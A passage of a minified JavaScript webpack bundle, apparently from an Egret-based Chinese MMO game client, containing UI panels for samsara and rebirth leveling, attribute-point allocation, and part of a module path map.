e=s.GlobalConfig.TitleConf[t.titleId];this.eTitle.text=null===e||void 0===e?void 0:e.name,this.eTitle.textColor=a.ItemUtil.getQualityColor((null===e||void 0===e?void 0:e.rare)||0),this.updateTitleEff(e)}},e.prototype.updateTitleEff=function(t){return(null===t||void 0===t?void 0:t.eff)?(this.titleMc||(this.titleMc=ObjectPool.pop("MovieClip"),this.effTopGrp.addChild(this.titleMc)),this.eTitle.visible=!1,this.effTopGrp.visible=!0,void this.titleMc.playFile(RES_DIR_EFF+t.eff,-1)):(this.titleMc&&this.effTopGrp.removeChild(this.titleMc),this.titleMc=null,this.effTopGrp.visible=!1,void(this.eTitle.visible=!0))},e}(n.BaseItemRender);e.BurningDesertRoomMemberItem=u,window.BurningDesertRoomMemberItem=u,__reflect(u.prototype,"BurningDesertRoomMemberItem",[]),window.BurningDesertRoomMemberItem=u},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LhProItem=e.LhHistoryItem=e.LhPanel=void 0;var n=i(21),o=i(8),s=i(3),a=i(1),r=i(22),l=i(0),h=i(180),u=i(15),p=i(4),d=i(30),c=i(10),f=i(58),g=i(76),m=i(12),v=i(7),y=i(2),C=i(27),T=i(121),b=i(532),w=i(533),I=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="LhPanelSkin",e.drawX=1,e.drawY=-2,e.drawR=78,e.percent=100,e.t=0,e._timeGo=0,e}return __extends(e,t),e.openCheck=function(){var t=m.OpenSystem.ins().checkSysOpen(u.SystemType.LHPanel);return t||y.TipsCT.ins().showTips(m.OpenSystem.ins().getNoOpenTips(u.SystemType.LHPanel)),t},e.prototype.addDisplay=function(){observe(this,this.setHistory,T.LhCT.ins().HistoryUpdate),observe(this,this.setInitData,T.LhCT.ins().updateInfo),this.LHList.itemRenderer=_,this.LHList.dataProvider=this.hisData=new eui.ArrayCollection([]),this.nowList.itemRenderer=S,this.nowList.dataProvider=this.nowData=new eui.ArrayCollection([]),this.nextList.itemRenderer=S,this.nextList.dataProvider=this.nextData=new eui.ArrayCollection([]),this.setInitData(),this.addTouchEvent(this.expBtn,this.onClick),this.addTouchEvent(this.LHBtn,this.onClick),this.addTouchEvent(this.btnHelp,this.onClick),this.addTouchEvent(this.txt_decomp0,this.onClick),T.LhCT.ins().sendLhHistoryData()},e.prototype.removeDisplay=function(){if(this.skin){if(this.Ball&&this.Ball.stop(),this.LHList&&this.LHList.numElements>0)for(var t=this.LHList.numElements-1;t>=0;t--){var e=this.LHList.getElementAt(t);e&&e.clearAll()}if(this.nowList&&this.nowList.numElements>0)for(var t=this.nowList.numElements-1;t>=0;t--){var e=this.nowList.getElementAt(t);e&&e.clearAll()}if(this.nextList&&this.nextList.numElements>0)for(var t=this.nextList.numElements-1;t>=0;t--){var e=this.nextList.getElementAt(t);e&&e.clearAll()}this.removeTouchEvent(this.expBtn,this.onClick),this.removeTouchEvent(this.LHBtn,this.onClick),Timer.stopAll(this),this.Ball&&egret.Tween.removeTweens(this.Ball),this.removeObserve()}},e.prototype.onClick=function(t){var e,i,n;switch(t.target){case this.expBtn:if(this._timeGo>0)win.open(b.LhExpTip);else{if(p.ActorCC.level<=l.GlobalConfig.SamsaraBaseConfig.minLevel)return void y.TipsCT.ins().showTips(gettext("人物等级需大于{0}级",l.GlobalConfig.SamsaraBaseConfig.minLevel));if(T.LhCT.ins().nowExp>=(null===(e=l.GlobalConfig.SamsaraLevelConfig[T.LhCT.ins().lv])||void 0===e?void 0:e.costExp))return void y.TipsCT.ins().showTips(gettext("经验已满"));if(l.GlobalConfig.SamsaraLevelConfig[T.LhCT.ins().lv]&&T.LhCT.ins().nowExp<1&&p.ActorCC.exp<(null===(i=l.GlobalConfig.SamsaraLevelConfig[T.LhCT.ins().lv])||void 0===i?void 0:i.costExp))return void C.WarnWin.show(gettext("当前等级经验不足，是否下降等级注入经验？"),function(){T.LhCT.ins().sendLhUp(1)},this);T.LhCT.ins().sendLhUp(1)}break;case this.LHBtn:if(this._timeGo>0)return void y.TipsCT.ins().showTips(gettext("恢复时间中"));if(T.LhCT.ins().nowExp<1)return void y.TipsCT.ins().showTips(gettext("经验不足"));T.LhCT.ins().sendLhUp(2);break;case this.btnHelp:win.open(g.CommonHelpWin,(null===(n=l.GlobalConfig.HelpInfoConfig[330])||void 0===n?void 0:n.text)||"");break;case this.txt_decomp0:win.open(w.LhLevelTip)}},e.prototype.setInitData=function(){var t,e;if(this.Ball)this.Ball.playFile(RES_DIR_EFF+"samsaraProg",-1);else{this.Ball=new n.MovieClip,this.effGrop.addChild(this.Ball),this.Ball.playFile(RES_DIR_EFF+"samsaraProg",-1),this.Ball.drawAngle(360);var i=new egret.Shape;this.effGrop.addChild(i),i.graphics.beginFill(255),i.graphics.drawCircle(this.drawX,this.drawY,this.drawR),i.graphics.endFill(),this.Ball.mask=i,this.effGrop.visible=!1}this.effGrop.visible=!0,this.proL.text=(T.LhCT.ins().nowExp||0)+"/"+((null===(t=l.GlobalConfig.SamsaraLevelConfig[T.LhCT.ins().lv])||void 0===t?void 0:t.costExp)||0);var s=T.LhCT.ins().wish;if(this.progressBar1.maximum=l.GlobalConfig.SamsaraBaseConfig.blessingLimit[l.GlobalConfig.SamsaraLevelConfig[T.LhCT.ins().lv].lvKey],this.progressBar1.value=s,this.percent=T.LhCT.ins().nowExp/((null===(e=l.GlobalConfig.SamsaraLevelConfig[T.LhCT.ins().lv])||void 0===e?void 0:e.costExp)||0)*100||0,this.percent<=0?this.Ball.y=2*this.drawR/100*(100-this.percent):(this.Ball.y=2*this.drawR,this.upAni()),this.t=T.LhCT.ins().TimesOut||0,this.t){var a=(o.DateUtils.formatMiniDateTime(this.t)-v.GameServerCC.serverTime)/1e3;this.timeLab.text=gettext("恢复时间：{0}",o.DateUtils.getFormatBySecond(a,o.DateUtils.TIME_FORMAT_1)),a>0?Timer.start(1e3,0,this.timeFun,this):(this.timeLab.text="",Timer.stop(this.timeFun,this))}this._timeGo=(o.DateUtils.formatMiniDateTime(this.t)-v.GameServerCC.serverTime)/1e3,this._timeGo>0?(this.timeLab.visible=!0,this.expBtn.label=gettext("道具恢复"),this.expBtn.eRp.visible=T.LhCT.ins().returnRP()):(this.timeLab.visible=!1,this.expBtn.label=gettext("注入经验"),this.expBtn.eRp.visible=!1),this.setNowAndNextPro(),this.setLight()},e.prototype.upAni=function(){egret.Tween.get(this.Ball).to({y:this.drawY},800)},e.prototype.setHistory=function(){var t,e,i,n=T.LhCT.ins().historyArr;n.length>0&&(this.hisData.replaceAll(n),(null===(t=this.scrl)||void 0===t?void 0:t.viewport)&&(null===(e=this.scrl)||void 0===e?void 0:e.viewport.contentHeight)>(null===(i=this.scrl)||void 0===i?void 0:i.height)&&(this.scrl.viewport.scrollV=this.scrl.viewport.contentHeight-this.scrl.height))},e.prototype.setNowAndNextPro=function(){var t=l.GlobalConfig.SamsaraLevelConfig[T.LhCT.ins().lv],e=l.GlobalConfig.SamsaraLevelConfig[T.LhCT.ins().lv+1],i=[],n=[],o="",s="";switch(p.ActorCC.jobId){case h.JobConst.ZhanShi:if(t&&0!=T.LhCT.ins().lv){var a=[],u=[];for(var d in t.attr_1)a.push(t.attr_1[d]),u.push(0);var c=r.AttributeData.getAttrShowStr(a,": ",u);i.push(c)}if(e){var a=[],u=[];for(var d in e.attr_1)a.push(e.attr_1[d]),u.push(0);var f=r.AttributeData.getAttrShowStr(a,": ",u);n.push(f)}break;case h.JobConst.FaShi:if(t&&0!=T.LhCT.ins().lv){var a=[],u=[];for(var d in t.attr_2)a.push(t.attr_2[d]),u.push(0);var g=r.AttributeData.getAttrShowStr(a,": ",u);i.push(g)}if(e){var a=[],u=[];for(var d in e.attr_2)a.push(e.attr_2[d]),u.push(0);var m=r.AttributeData.getAttrShowStr(a,": ",u);n.push(m)}break;case h.JobConst.DaoShi:if(t&&0!=T.LhCT.ins().lv){var a=[],u=[];for(var d in t.attr_3)a.push(t.attr_3[d]),u.push(0);var v=r.AttributeData.getAttrShowStr(a,": ",u);i.push(v)}if(e){var a=[],u=[];for(var d in e.attr_3)a.push(e.attr_3[d]),u.push(0);var y=r.AttributeData.getAttrShowStr(a,": ",u);n.push(y)}break;case h.JobConst.CiKe:if(t&&0!=T.LhCT.ins().lv){var a=[],u=[];for(var d in t.attr_4)a.push(t.attr_4[d]),u.push(0);var C=r.AttributeData.getAttrShowStr(a,": ",u);i.push(C)}if(e){var a=[],u=[];for(var d in e.attr_4)a.push(e.attr_4[d]),u.push(0);var b=r.AttributeData.getAttrShowStr(a,": ",u);n.push(b)}break;case h.JobConst.GongShou:if(t&&0!=T.LhCT.ins().lv){var a=[],u=[];for(var d in t.attr_5)a.push(t.attr_5[d]),u.push(0);var w=r.AttributeData.getAttrShowStr(a,": ",u);i.push(w)}if(e){var a=[],u=[];for(var d in e.attr_5)a.push(e.attr_5[d]),u.push(0);var I=r.AttributeData.getAttrShowStr(a,": ",u);n.push(I)}}0==T.LhCT.ins().lv?(o=gettext("六道·初境"),this.titleBg1.source="samsara_0",this.titleBg3.source="samsara_00",i.push(gettext("无"))):(o=null===t||void 0===t?void 0:t.lvName,t.skillDesc&&i.push(t.skillDesc)),e&&void 0!=e?(s=null===e||void 0===e?void 0:e.lvName,e.skillDesc&&n.push(e.skillDesc)):(s=gettext("已满境"),n.push(gettext("无"))),this.nowL.text=o,this.nextL.text=s,this.nowData.replaceAll(i),this.nowData.refresh(),this.nextData.replaceAll(n),this.nextData.refresh(),0!=T.LhCT.ins().lv&&(T.LhCT.ins().lv==l.GlobalConfig.SamsaraLevelConfig[this.returnLength()-1].id?this.titleBg1.source="samsara_6":T.LhCT.ins().lv%6==0?this.titleBg1.source="samsara_"+Math.floor(T.LhCT.ins().lv/6):this.titleBg1.source="samsara_"+(Math.floor(T.LhCT.ins().lv/6)+1),T.LhCT.ins().lv%6==0?this.titleBg3.source="samsara_06":this.titleBg3.source="samsara_0"+T.LhCT.ins().lv%6);var _=t.successRate,S=(_/100).toFixed(0),x=l.GlobalConfig.SamsaraBaseConfig.rateName+"|C:0x35E62D&T:"+S+"%|";if(t.successRate){this.desc.textFlow=TextFlowMakerEntry.generateTextFlow1(x);var D=Math.floor(T.LhCT.ins().wish/l.GlobalConfig.SamsaraBaseConfig.pointAddRate),A="|C:0x35E62D&T:+"+D+"%|";this.addRate.textFlow=TextFlowMakerEntry.generateTextFlow1(A)}else this.desc.text=gettext("已满境"),this.addRate.text=""},e.prototype.returnLength=function(){var t=0;for(var e in l.GlobalConfig.SamsaraLevelConfig)t++;return t},e.prototype.setLight=function(){var t=(T.LhCT.ins().lv-1)%6;if(0!=T.LhCT.ins().lv)for(var e=0;6>e;e++)this["d"+e].source=t>=e?"cir1":"cir0"},e.prototype.timeFun=function(){var t=(o.DateUtils.formatMiniDateTime(this.t)-v.GameServerCC.serverTime)/1e3;return 0>=t?(this.timeLab.text="",Timer.stop(this.timeFun,this),void this.setInitData()):void(this.timeLab.text=gettext("恢复时间：{0}",o.DateUtils.getFormatBySecond(t,o.DateUtils.TIME_FORMAT_1)))},e.prototype.tabRp=function(){return!1},e}(a.BaseView);e.LhPanel=I,window.LhPanel=I,__reflect(I.prototype,"LhPanel",[]),window.LhPanel=I;var _=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t,e,i,n,o,s,a,r=l.GlobalConfig.SamsaraBaseConfig.noticeTxt,h=l.GlobalConfig.SamsaraLevelConfig,u="";if(this.data){switch(this.data.result){case 1:u=r[0],u+=gettext("，由{0}进阶为{1}","|C:0x35E62D&T:"+((null===(t=h[this.data.lv])||void 0===t?void 0:t.lvName)||gettext("六道.初境"))+"|","|C:0x35E62D&T:"+((null===(e=h[this.data.lv+1])||void 0===e?void 0:e.lvName)||gettext("六道.初境"))+"|");break;case 2:u=r[0],u+=gettext("，由{0}进阶为{1}","|C:0x35E62D&T:"+((null===(i=h[this.data.lv])||void 0===i?void 0:i.lvName)||gettext("六道.初境"))+"|","|C:0x35E62D&T:"+((null===(n=h[this.data.lv+1])||void 0===n?void 0:n.lvName)||gettext("六道.初境"))+"|");break;case 3:u=r[1];break;case 4:u=r[1]}var p="";switch(this.data.type){case 1:break;case 2:p="，";var g="|C:0xF3311E&T:"+this.data.prisent/100+"%|",m=[];m.push(g),p+=f.LangUtils.formatStr(r[3],m);break;case 3:p="，",p+=r[4];break;case 4:p="，";var v="";for(var y in this.data.item){var C=void 0;if(0==this.data.item[y].type){C=c.ItemUtil.getQualityColor(1);var T=d.RewardData.getCurrencyName(this.data.item[y].itemId);v="|C:"+C+"&T:"+T+"|"}else{var b=l.GlobalConfig.ItemConfig[this.data.item[y].itemId].descIndex,w=l.GlobalConfig.ItemDescConfig[b].quality;C=c.ItemUtil.getQualityColor(w);var T=l.GlobalConfig.ItemConfig[this.data.item[y].itemId].name;v="|C:"+C+"&T:"+T+"|"}v+="*"+this.data.item[y].count+" "}var I=[];I.push(v),p+=f.LangUtils.formatStr(r[2],I);break;case 5:p="，",p+=r[5];var _=this.data.lv%6,S=0;S=1==_?this.data.lv:this.data.lv-(_-1),p+=gettext("从{0}降到{1}","|C:0xF3311E&T:"+(null===(s=h[null===(o=this.data)||void 0===o?void 0:o.lv])||void 0===s?void 0:s.lvName)+"|","|C:0xF3311E&T:"+(null===(a=h[this.data.orDownLv])||void 0===a?void 0:a.lvName)+"|")}this.hisL.textFlow=TextFlowMakerEntry.generateTextFlow1(u+p)}},e.prototype.clearAll=function(){this.hisL.text=""},e}(s.BaseItemRender);e.LhHistoryItem=_,window.LhHistoryItem=_,__reflect(_.prototype,"LhHistoryItem",[]);var S=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.data&&(this.proL.textFlow=TextFlowMakerEntry.generateTextFlow(this.data),this.height=this.proL.height)},e.prototype.clearAll=function(){this.proL.text=""},e}(s.BaseItemRender);e.LhProItem=S,window.LhProItem=S,__reflect(S.prototype,"LhProItem",[])},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ZsAndLhWin=void 0;var n=i(1),o=i(17),s=i(6),a=i(67),r=i(26),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ZsAndLhWinSkin",e.openIdx=0,e}return __extends(e,t),e.prototype.addDisplay=function(t){this.baseTab=this.eTab,this.baseViewStack=this.eVs,this.initTab(),this.openIdx>-1&&(this.baseTab.selectedIndex=this.baseViewStack.selectedIndex=this.openIdx)},e.prototype.initTab=function(){observe(this,this.updateTabRed,r.ZsCT.ins().postZsLv),observe(this,this.updateTabRed,s.BagCT.ins().postItemAdd),observe(this,this.updateTabRed,o.RedPointBaseSys.ins().RpChange)},e.prototype.updateTabRed=function(){this.eTab.updateReds()},e.prototype.removeDisplay=function(){this.skin&&(this.openIdx=-1)},e.prototype.changeView=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.baseTab?(this.baseTab.selectedIndex=t[0]||0,this.baseViewStack&&(this.baseViewStack.selectedIndex=t[0]||0)):t&&(this.openIdx=t[0]||0)},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return r.ZsCT.ins().checkOpen(!0)?!0:(win.open(a.View_BianQiang,2),!1)},e.prototype.tabRp=function(){return r.ZsCT.ins().rp.v},e}(n.BaseView);e.ZsAndLhWin=l,window.ZsAndLhWin=l,__reflect(l.prototype,"ZsAndLhWin",[]),window.ZsAndLhWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ZsPanel=void 0;var n=i(19),o=i(70),s=i(1),a=i(22),r=i(34),l=i(0),h=i(36),u=i(4),p=i(13),d=i(6),c=i(59),f=i(2),g=i(27),m=i(121),v=i(26),y=i(536),C=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ZsPanelSkin",e.imgW=50,e.imgH=50,e._BtnCount=5,e._ResetCount=0,e._UseCount=0,e.showAddArr=[0,0,0,0,0],e._MAX_ATTR_COUNT=5,e.timeS=0,e.numV=1,e}return __extends(e,t),e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return v.ZsCT.ins().checkOpen(!0)},e.prototype.addDisplay=function(){this.timeS=0,this.numV=1,this.chang0.visible=this.chang1.visible=this.titleBg1.visible=!1,observe(this,this.updateView,v.ZsCT.ins().postZsLv),observe(this,this.useItem,d.BagCT.ins().postItemAdd),this.addTouchEvent(this.upBtn,this.onClick),this.addTouchEvent(this.keepBtn,this.onClick),this.addTouchEvent(this.resetBtn,this.onClick),this.addTouchEvent(this.goGrp,this.onClick);for(var t=0;t<this._BtnCount;t++)this["c"+t].addEventListener(egret.TouchEvent.TOUCH_BEGIN,this.onClickBegin,this),this["c"+t].addEventListener(egret.TouchEvent.TOUCH_END,this.onClickEnd,this),this["c"+t].addEventListener(egret.TouchEvent.TOUCH_RELEASE_OUTSIDE,this.onClickEnd,this),this["a"+t].addEventListener(egret.TouchEvent.TOUCH_BEGIN,this.onClickBegin,this),this["a"+t].addEventListener(egret.TouchEvent.TOUCH_END,this.onClickEnd,this),this["a"+t].addEventListener(egret.TouchEvent.TOUCH_RELEASE_OUTSIDE,this.onClickEnd,this);this.updateView(),this._UseCount=0},e.prototype.updateView=function(){var t=v.ZsCT.ins().lv;if(t>=110){this.chang0.visible=this.chang1.visible=this.titleBg1.visible=!0,this.updateViewPos(t);var e=t%110;this.lvLab.text=gettext("{0}转",Math.floor(e/11))+gettext("{0}级",e%11),this.lvLab.verticalCenter=-325}else this.lvLab.text=gettext("{0}转",v.ZsCT.ins().stage)+gettext("{0}级",v.ZsCT.ins().lv%11);var i=l.GlobalConfig.ZhuanShengStageConfig[t+1];this.upGrp.visible=i?!0:!1,this.maxTxt.visible=!this.upGrp.visible;var n=l.GlobalConfig.ZhuanShengStageConfig[t];n&&(this.barLab.text=v.ZsCT.ins().exp+"/"+n.needExp,this.bar.value=Math.min(v.ZsCT.ins().exp/n.needExp*100,100)),this.setLab.text=gettext("未分配点数:{0}",v.ZsCT.ins().getAddPoint()-this._UseCount),this.line(),this.showAttr(),this._ResetCount=v.ZsCT.ins().getAddPoint(),this.upBtn.red.visible=v.ZsCT.ins().isCanUp(),this.xwRp.visible=v.ZsCT.ins().checkXWRp()},e.prototype.updateViewPos=function(t){var e=Math.floor(Math.floor(t/11)/10),i=l.GlobalConfig.NewZhuanShengConfig[e];if(i){var n=i.pointPos;for(var o in n)this["bgd"+o].x=n[o][0],this["bgd"+o].y=n[o][1],this["d"+o].x=n[o][0],this["d"+o].y=n[o][1];this.titleBg.source="zs_namebg",this.chang1.source=i.icon,this.titleBg1.source=i.fontImg}},e.prototype.initLine=function(){for(var t=0;this["d"+t];){var e=t+1;if(this["d"+e]){this["x"+e].x=this["bgx"+e].x=this["d"+t].x+this.imgW/2,this["x"+e].y=this["bgx"+e].y=this["d"+t].y+this.imgH/2;var i=o.MathUtils.getDistance(this["d"+t].x,this["d"+t].y,this["d"+e].x,this["d"+e].y);this["bgx"+e].width=i,this["x"+e].width=i;var n=o.MathUtils.getRadian2(this["d"+t].x,this["d"+t].y,this["d"+e].x,this["d"+e].y),s=o.MathUtils.getAngle(n);this["bgx"+e].rotation=s,this["x"+e].rotation=s}t++}},e.prototype.line=function(){this.initLine();for(var t=v.ZsCT.ins().lv%11,e=0;10>e;e++)this["d"+e].visible=t>e,this["x"+e]&&(this["x"+e].visible=t>e)},e.prototype.showAttr=function(){for(var t,e,i,n,o="",s="",h=!1,u=0;u<this._MAX_ATTR_COUNT;u++){this["addNum"+u]&&(this.showAddArr[u]?this["addNum"+u].text="+"+this.showAddArr[u]:this["addNum"+u].text=""),this["curNum"+u]&&(this["curNum"+u].text=""+((null===(t=v.ZsCT.ins().attr[u])||void 0===t?void 0:t.count)||0));var d=u+1,c=l.GlobalConfig.ZhuanShengAttrConfig[d],f=!1;if(c)for(var g=c.attr,m=0;m<g.length;m++){var y=null===(e=g[m])||void 0===e?void 0:e.type,C=g[m].value,T=C*v.ZsCT.ins().attr[u].count;if(3==d||4==d){if(f)break;var b=p.SubRoles.ins().getSubRoleByIndex(0);y=null===(i=g[b.job-1])||void 0===i?void 0:i.type,T=((null===(n=g[b.job-1])||void 0===n?void 0:n.value)||0)*v.ZsCT.ins().attr[u].count}f=!0;var w=a.AttributeData.getAttrStrByType(y);s+=w,s+=""==w?" ":": ",s+=T,3==d||4==d?(h||(o+=this.showAddArr[u]||this.showAddArr[u+1]?"+"+this.showAddArr[u]*C+"-"+(this.showAddArr[u+1]?this.showAddArr[u+1]*C:"0")+"\n":"\n"),h=!0):o+=this.showAddArr[u]?(""==w?"":"+")+this.showAddArr[u]*C:"",y==r.AttributeType.atAtkMin||y==r.AttributeType.atAtkMageMin||y==r.AttributeType.atAtkTaoistMin||y==r.AttributeType.atDef?(s+=" -",3!=d&&(o+=this.showAddArr[u]?"-":"")):y==r.AttributeType.atAtkMax||y==r.AttributeType.atAtkMageMax||y==r.AttributeType.atAtkTaoistMax||y==r.AttributeType.atRes?(s+="\n",4!=d&&(o+="\n")):""!=s&&(s+="\n",o+="\n")}}this.addAtt.text=o,this.curAtt.text=s},e.prototype.onClickBegin=function(t){this.eTatrge=t.target.name,Timer.start(150,-1,this.timeClick,this)},e.prototype.timeClick=function(t){if(this.eTatrge){var e=this.eTatrge,i=0,n=v.ZsCT.ins().getAddPoint()-this._UseCount,o=this.showAddArr[Number(e[1])];if("a"==e[0]){if(this._UseCount>=this._ResetCount)return;this.setTimes(),n<=this.numV?(this._UseCount+=n,i=n):(this._UseCount+=this.numV,i=this.numV)}else if("c"==e[0]){if(this._UseCount<=0||!this.showAddArr[Number(e[1])])return;this.setTimes(),o<=this.numV?(this._UseCount-=o,i=-o):(this._UseCount-=this.numV,i=-this.numV)}this.showAddArr[Number(e[1])]=this.showAddArr[Number(e[1])]+i,this.showAttr(),this.setLab.text=gettext("未分配点数:{0}",v.ZsCT.ins().getAddPoint()-this._UseCount)}},e.prototype.setTimes=function(){this.timeS+=.2,this.timeS>=1&&(this.timeS=0,this.numV*=2,this.numV>=100&&(this.numV=100))},e.prototype.onClickEnd=function(t){this.eTatrge&&t.target.name==this.eTatrge&&(this.eTatrge=t.target.name,this.timeS=0,this.numV=1,Timer.stop(this.timeClick,this),this.timeClick(t),this.eTatrge=null)},e.prototype.onClick=function(t){switch(t.target){case this.upBtn:var e=v.ZsCT.ins().lv,i=l.GlobalConfig.ZhuanShengStageConfig[e];if(u.ActorCC.level<i.needLevel)return f.TipsCT.ins().showTips(gettext("等级不足:需求等级 ")+i.needLevel),void c.GameFlashSaleCt.ins().reportLvNot();if(v.ZsCT.ins().exp<i.needExp)return f.TipsCT.ins().showTips(gettext("修为不足")),void c.GameFlashSaleCt.ins().reportZsLvNot();if((null===i||void 0===i?void 0:i.lhLevel)&&m.LhCT.ins().lv<i.lhLevel)return void f.TipsCT.ins().showTips(gettext("需轮回等级达到{0}",l.GlobalConfig.SamsaraLevelConfig[i.lhLevel].lvName));v.ZsCT.ins().sendZsUpgrade();break;case this.keepBtn:if(!this._UseCount)return;for(var o=[],s=0;s<this.showAddArr.length;s++)this.showAddArr[s]&&o.push({id:s+1,count:this.showAddArr[s]});v.ZsCT.ins().sendZsSetAttr(o),this.showAddArr=[0,0,0,0,0],this._UseCount=0;break;case this.resetBtn:for(var a=v.ZsCT.ins().attr,r=!1,s=0;s<a.length;s++)if(a[s].count>0){r=!0;break}if(!r)return;g.WarnWin.show(gettext("是否花费{0}元宝进行重置?",l.GlobalConfig.ZhuanShengConfig.resetCost),function(){n.GlobalFun.checkCost(l.GlobalConfig.ZhuanShengConfig.resetCost,h.MoneyConst.yuanbao)&&v.ZsCT.ins().sendZsReset()},this);break;case this.goGrp:win.open(y.ZzXiuWeiTip)}},e.prototype.useItem=function(){},e.prototype.tabRp=function(){return v.ZsCT.ins().rp.v},e}(s.BaseView);e.ZsPanel=C,window.ZsPanel=C,__reflect(C.prototype,"ZsPanel",[]),window.ZsPanel=C},function(t,e,i){function n(t){var e=o(t);return i(e)}function o(t){if(!i.o(s,t)){var e=new Error("Cannot find module '"+t+"'");throw e.code="MODULE_NOT_FOUND",e}return s[t]}var s={"./game/component/AttrInfoPanel.ts":1390,"./game/component/BaseWinBg.ts":1391,"./game/component/BossUIBtnItem.ts":1392,"./game/component/ComAttrBasicItem.ts":537,"./game/component/ComAttrBasicItem2.ts":1393,"./game/component/ComProgressBar.ts":1394,"./game/component/CostCom.ts":485,"./game/component/CostComRender.ts":110,"./game/component/DefeatItem.ts":1395,"./game/component/DropDown.ts":1396,"./game/component/EncounterInfoItem.ts":1397,"./game/component/EquipTipsItemBase.ts":1398,"./game/component/FbItem.ts":1399,"./game/component/GuildInfoPanel.ts":1400,"./game/component/GuildListPanel.ts":1402,"./game/component/GuildManagePanel.ts":1404,"./game/component/GuildMemberPanel.ts":1407,"./game/component/GuildTaskPanel.ts":1409,"./game/component/GwBossRemindItem.ts":1410,"./game/component/HeirloomItem.ts":1411,"./game/component/HeirloomItemIcon.ts":1412,"./game/component/HomeBossRemindItem.ts":1413,"./game/component/HonorMarketItemRenderer.ts":538,"./game/component/ImageArray.ts":1414,"./game/component/ItemBase.ts":11,"./game/component/ItemBaseEff4.ts":1415,"./game/component/ItemBaseEff5.ts":269,"./game/component/ItemBaseEff6.ts":412,"./game/component/ItemBaseNoEff.ts":1416,"./game/component/ItemBaseNoName.ts":77,"./game/component/ItemBaseNoTap.ts":350,"./game/component/ItemBaseNoTapNoDetail.ts":1417,"./game/component/ItemBaseSelect.ts":1418,"./game/component/ItemBaseTimes.ts":1419,"./game/component/ItemIcon.ts":1420,"./game/component/ItemShopItemRenderer.ts":1421,"./game/component/ItemStage.ts":1422,"./game/component/JimMaiItem.ts":1423,"./game/component/JingMaiPanel.ts":1424,"./game/component/LadderStarListView.ts":1425,"./game/component/LadderStarView.ts":1426,"./game/component/LevelImage.ts":1427,"./game/component/MijiItem.ts":1428,"./game/component/MijiPanel.ts":1429,"./game/component/MovieEui.ts":1430,"./game/component/PersonRewardRenderer.ts":1431,"./game/component/PersonalBossPanel.ts":1432,"./game/component/PowerPanel.ts":1433,"./game/component/PriceIcon.ts":1434,"./game/component/PubBossRemindItem.ts":1435,"./game/component/PunchEquipItem.ts":1436,"./game/component/PunchEquipItemBase.ts":1437,"./game/component/PunchEquipPanel.ts":1438,"./game/component/RankItemRenderer.ts":491,"./game/component/RedBagRenderer.ts":1439,"./game/component/RoleInfoItem.ts":1440,"./game/component/RoleItem.ts":1441,"./game/component/RoleItemRenderer.ts":1442,"./game/component/RoleMasterItem.ts":1443,"./game/component/RpButton.ts":1444,"./game/component/SkillAndTotemWin.ts":1445,"./game/component/SkillItem.ts":539,"./game/component/SkillItemItem.ts":540,"./game/component/SkillPanel.ts":1446,"./game/component/SmeltEquipNormalPanel.ts":1447,"./game/component/SmeltItemList.ts":1448,"./game/component/TabBarItemRender.ts":211,"./game/component/WingAttrWin.ts":1449,"./game/entity/component/CharNpc.ts":1450,"./game/entity/component/CharTransfer.ts":1451,"./game/entity/component/EntityBuff.ts":1453,"./game/entity/component/Progress.ts":1454,"./game/module/activity/happySevenDay/component/CDYBZhuanPanShowItem.ts":1455,"./game/module/activity/happySevenDay/component/HSDTabListItemRender.ts":541,"./game/module/activity/happySevenDay/component/HappySevenDayBtnItemRender.ts":1456,"./game/module/activity/happySevenDay/component/HappySevenDayDayItem.ts":542,"./game/module/activity/happySevenDay/component/HappySevenDayItemRender.ts":543,"./game/module/activity/happySevenDay/component/HappySevenDayScoreItem.ts":544,"./game/module/activity/happySevenDay/component/HappySevenDayTabListItemRender.ts":545,"./game/module/activity/happySevenDay/component/SDShowItemRender.ts":1457,"./game/module/activity/model/component/ActivityType0Data.ts":280,"./game/module/activity/model/component/ActivityType10Data.ts":1458,"./game/module/activity/model/component/ActivityType11Data.ts":1459,"./game/module/activity/model/component/ActivityType12Data.ts":171,"./game/module/activity/model/component/ActivityType13Data.ts":1460,"./game/module/activity/model/component/ActivityType18Data.ts":1461,"./game/module/activity/model/component/ActivityType19Data.ts":1462,"./game/module/activity/model/component/ActivityType1Data.ts":546,"./game/module/activity/model/component/ActivityType22Data.ts":1463,"./game/module/activity/model/component/ActivityType2Data.ts":202,"./game/module/activity/model/component/ActivityType38Data.ts":240,"./game/module/activity/model/component/ActivityType3Data.ts":1464,"./game/module/activity/model/component/ActivityType40Data.ts":1465,"./game/module/activity/model/component/ActivityType41Data.ts":284,"./game/module/activity/model/component/ActivityType42Data.ts":1466,"./game/module/activity/model/component/ActivityType49Data.ts":1467,"./game/module/activity/model/component/ActivityType4Data.ts":203,"./game/module/activity/model/component/ActivityType52Data.ts":345,"./game/module/activity/model/component/ActivityType53Data.ts":1468,"./game/module/activity/model/component/ActivityType55Data.ts":1469,"./game/module/activity/model/component/ActivityType56Data.ts":1470,"./game/module/activity/model/component/ActivityType57Data.ts":204,"./game/module/activity/model/component/ActivityType58Data.ts":1471,"./game/module/activity/model/component/ActivityType59Data.ts":1472,"./game/module/activity/model/component/ActivityType5Data.ts":348,"./game/module/activity/model/component/ActivityType60Data.ts":1473,"./game/module/activity/model/component/ActivityType62Data.ts":343,"./game/module/activity/model/component/ActivityType64Data.ts":1474,"./game/module/activity/model/component/ActivityType65Data.ts":1475,"./game/module/activity/model/component/ActivityType70Data.ts":1476,"./game/module/activity/model/component/ActivityType71Data.ts":1477,"./game/module/activity/model/component/ActivityType72Data.ts":1478,"./game/module/activity/model/component/ActivityType7Data.ts":243,"./game/module/activi